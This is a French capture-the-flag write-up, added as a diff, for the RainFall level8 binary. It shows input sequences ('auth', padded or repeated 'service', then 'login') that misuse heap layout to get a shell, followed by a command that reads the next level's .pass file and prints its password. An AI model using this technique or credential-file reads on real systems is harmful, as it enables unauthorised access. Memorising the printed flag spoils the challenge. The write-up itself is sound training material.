@@ -1,0 +1,59 @@
+Pour ce niveau. Nous avons un binaire qui attendra un stdin
+
+et qui retournera quelque chose.
+
+level8@RainFall:~$ ./level8
+(nil), (nil)
+test
+(nil), (nil)
+tra
+(nil), (nil)
+cedfe
+(nil), (nil)
+d
+(nil), (nil)
+
+(nil), (nil)
+
+Voir disas_analys
+
+Pour comprendre aller voir le fichier source.c
+
+Pour pouvoir exploiter la faille il faut reussir a faire en sorte que auth == 32
+
+En faisant un 'auth ', auth sera = un input + strlen('auth');
+
+pareil pour service
+
+Donc si nous faisons un 'auth ' + serviceqwertyuiopasdfgh + login cela donne
+
+level8@RainFall:~$ ./level8
+(nil), (nil)
+auth
+0x804a008, (nil)
+serviceqwertyuiopasdfgh
+0x804a008, 0x804a018
+login
+$ whoami
+level9
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+
+
+On peut aussi faire comme ca
+
+car en appellant 2 fois service va permettre a la deuxieme string d'etre alouer a exactement 32 bytes
+
+level8@RainFall:~$ ./level8
+(nil), (nil)
+auth
+0x804a008, (nil)
+service
+0x804a008, 0x804a018
+service
+0x804a008, 0x804a028
+login
+$ whoami
+level9
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
